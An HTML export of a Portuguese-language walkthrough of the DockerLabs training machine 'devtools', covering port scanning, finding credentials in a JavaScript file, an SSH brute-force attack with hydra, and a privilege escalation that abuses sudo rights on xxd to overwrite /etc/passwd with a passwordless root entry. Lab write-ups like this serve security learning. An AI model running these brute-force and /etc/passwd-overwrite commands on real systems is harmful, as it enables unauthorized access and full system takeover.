<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>maq.devtools</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>maq.devtools</h1><br/><p></p><p><strong><span style="color:#ff0000;">MÁQUINA DEVTOOLS</span></strong></p><p></p><p><img src="images/229-1.png" alt="images/229-1.png" /></p><p></p><p><strong>Para utilizar esta máquina devemos primeiro baixar os arquivos e assim implantá-la com Docker.</strong><strong></strong></p><p><strong>  </strong><strong></strong></p><p><strong>Baixamos o arquivo da página </strong><strong><a href="https://dockerlabs.es/">https://dockerlabs.es/</a></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Para implantar o laboratório executamos da seguinte forma, para que também possamos ver que ele nos diz a direção que teremos, bem como o que fazer quando terminarmos.</strong></p><p></p><p><img src="images/229-2.png" alt="images/229-2.png" /></p><p></p><p><strong><span style="color:#ff0000;">COLETA DE INFORMAÇÕES </span></strong></p><p></p><p><strong><span style="color:#ff7800;">nmap 172.17.0.2 -A -sS -sC -sV -Pn -p- -T5 </span></strong></p><p></p><p><strong>Temos duas portas aberta:</strong></p><p></p><p><strong>22/tcp open  ssh     OpenSSH 9.2p1 Debian</strong><strong></strong></p><p><strong>80/tcp open  http    Apache httpd 2.4.62 ((Debian))</strong></p><p></p><p><img src="images/229-3.png" alt="images/229-3.png" /></p><p></p><p><strong>Vamos fazer um </strong><strong><span style="color:#ff7800;">fuzzing </span></strong><strong>para ver se tem pastas ocultas, com a ferramenta </strong><strong><span style="color:#ff7800;">gobuster</span></strong><strong>.</strong></p><p></p><p><strong>gobuster dir -u </strong><strong><a href="http://172.17.0.2">http://172.17.0.2</a></strong><strong> -w /usr/share/seclists/Discovery/Web-Content/big.txt -x .txt,.html,.php,.py</strong></p><p></p><p><strong>Não temos nada de interessante.</strong></p><p></p><p><img src="images/229-4.png" alt="images/229-4.png" /></p><p></p><p><strong>Vamos explorar a porta 80: </strong><strong><a href="http://172.17.0.2/">http://172.17.0.2/</a></strong></p><p></p><p><strong>Veja que esta pedindo para fazer o login na página.</strong></p><p></p><p><img src="images/229-5.png" alt="images/229-5.png" /></p><p></p><p><strong>Vamos explorar o código fonte diretamente pelo link: view-source:</strong><strong><a href="http://172.17.0.2/">http://172.17.0.2/</a></strong></p><p></p><p><strong>Veja que temos um arquivo </strong><strong><span style="color:#ff7800;">backupp.js</span></strong>.</p><p></p><p><img src="images/229-6.png" alt="images/229-6.png" /></p><p></p><p><strong>Ao explorar esse arquivo </strong><strong><span style="color:#ff7800;">backupp.js</span></strong><strong>, temos senha e usuário e uma senha antiga. </strong></p><p></p><p><strong>usuário= </strong><strong><span style="color:#ff7800;">chocolate</span></strong><strong></strong></p><p><strong>senha= </strong><strong><span style="color:#ff7800;">chocolate</span></strong><strong></strong></p><p><strong>senha antiga= </strong><strong><span style="color:#ff7800;">baluleroh</span></strong></p><p></p><p><img src="images/229-7.png" alt="images/229-7.png" /></p><p></p><p><strong>Outra maneira de acessar o código fonte, é diretamente pelo terminal.</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Esse comando visualiza o código fonte diretamente pelo terminal:</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong> </strong><strong><span style="color:#ff7800;">curl -s </span></strong><strong><a href="http://172.17.0.2">http://172.17.0.2</a></strong><strong><span style="color:#ff7800;"> </span></strong></p><p> </p><p> <img src="images/229-8.png" alt="images/229-8.png" /></p><p> </p><p> <strong>Com esse comando baixamos o código fonte na máquina atacante.</strong><strong></strong></p><p><strong> </strong><strong></strong></p><p><strong> </strong><strong><span style="color:#ff7800;">curl -s http://172.17.0.2 -o pagina.html</span></strong></p><p> </p><p> <img src="images/229-9.png" alt="images/229-9.png" /></p><p> </p><p> <strong>Comando para baixar o arquivo backupp.js.</strong><strong></strong></p><p><strong> </strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff7800;"> curl -s http://172.17.0.2/backupp.js -o backupp.js</span></strong></p><p> </p><p> <img src="images/229-10.png" alt="images/229-10.png" /></p><p> </p><p><strong> Agora vamos testar a senha na página web.</strong></p><p> </p><p><strong>Conseguimos fazer o login na página, mas não temos nada de interessante. </strong></p><p> </p><p> <img src="images/229-11.png" alt="images/229-11.png" /></p><p> </p><p> <strong>Analisando tudo que conseguimos na exploração, temos uma senha antiga </strong><strong><span style="color:#ff7800;">“baluleroh”</span></strong><strong>, então vamos explorar a </strong><strong><span style="color:#ff7800;">porta 22 ssh </span></strong><strong>e fazer um ataque de força bruta com</strong><strong><span style="color:#ff7800;"> hydra</span></strong><strong>, usando essa senha antiga.</strong></p><p> </p><p> <strong><span style="color:#ff7800;">hydra -L /usr/share/wordlists/rockyou.txt -p baluleroh ssh://172.17.0.2 </span></strong></p><p> </p><p> <img src="images/229-12.png" alt="images/229-12.png" /></p><p> </p><p> <strong>Já que conseguimos o usuário e a senha vamos entrar no ssh.</strong></p><p> </p><p> <strong><span style="color:#ff7800;">ssh carlos@172.17.0.2</span></strong></p><p></p><p> <img src="images/229-13.png" alt="images/229-13.png" /></p><p> </p><p> <strong>A partir da mensagem contida no arquivo </strong><strong><code>nota.txt</code></strong><strong>, parece que há um arquivo chamado </strong><strong><code>data.bak</code></strong><strong> dentro do diretório de root ( </strong><strong><code>/root</code></strong><strong>). Este arquivo pode conter informações ou credenciais importantes para progredir no desafio.</strong></p><p> </p><p> <img src="images/229-14.png" alt="images/229-14.png" /></p><p> </p><p> <strong>O usuário </strong><strong><code>carlos</code></strong><strong> tem permissão para executar os comandos </strong><strong><code>/usr/bin/ping</code></strong><strong> e </strong><strong><code>/usr/bin/xxd</code></strong><strong> como </strong><strong><code>root</code></strong><strong> em senha. Vamos explorar essas permissões para escalar privilégios.</strong></p><p> </p><p> <img src="images/229-15.png" alt="images/229-15.png" /></p><p></p><p><strong>Com esse comando podemos editar o usuário </strong><strong><span style="color:#ff7800;">root </span></strong><strong>e tirar o x, e podemos ser superusuário com </strong><strong><span style="color:#ff7800;">su</span></strong><strong>.</strong></p><p></p><p> <strong><span style="color:#ff7800;">echo root::0:0:root:/root:/bin/bash | sudo xxd | sudo xxd -r - &quot;/etc/passwd</span></strong>&quot;</p><p> </p><p> <img src="images/229-16.png" alt="images/229-16.png" /></p><p> </p><p> <strong><span style="color:#ff7800;">somos root</span></strong><strong></strong></p><p><strong> </strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff0000;text-decoration:line-through;"> R10</span></strong></p><p></p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p></div>
</body>
</html>
